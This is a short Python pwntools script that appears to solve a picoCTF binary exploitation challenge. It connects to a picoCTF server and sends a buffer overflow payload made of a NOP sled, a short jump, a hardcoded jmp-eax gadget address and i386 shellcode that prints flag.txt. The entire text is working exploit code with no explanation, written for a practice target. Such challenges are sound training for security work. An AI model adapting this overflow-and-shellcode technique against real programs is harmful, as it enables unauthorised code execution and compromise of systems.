#!/usr/bin/python3
from pwn import *
import os

os.system("clear")

elf = ELF('./vuln')

#io = elf.process()
io = remote("saturn.picoctf.net", 60571)

jmp_eax = 0x0805334b

payload = b""
payload += b"\x90" * 24
payload += b"\xeb\x08\x90\x90"
payload += p32(jmp_eax)
payload += b"\x90" * 32
payload += asm(shellcraft.i386.linux.cat("flag.txt"))

io.recv()

io.sendline(payload)

print(io.recv())
